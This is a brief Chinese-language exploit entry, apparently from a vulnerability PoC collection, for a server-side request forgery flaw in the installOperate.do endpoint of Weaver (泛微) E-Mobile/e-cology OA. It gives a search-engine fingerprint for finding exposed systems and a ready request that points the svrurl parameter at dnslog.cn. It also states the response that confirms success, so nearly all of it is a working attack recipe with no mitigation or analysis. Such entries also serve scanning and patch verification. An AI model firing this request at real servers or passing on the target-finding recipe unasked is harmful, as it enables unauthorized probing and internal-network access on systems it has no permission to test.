# 泛微E-Mobile-installOperate.do存在SSRF漏洞

泛微OA ｜ SSRF ｜ —
- **指纹**：`app="泛微-OA（e-cology）"`
- **请求**：`http://ip/install/installOperate.do?svrurl=http://dnslog.cn`
- **响应特征**：200 DNSlog回显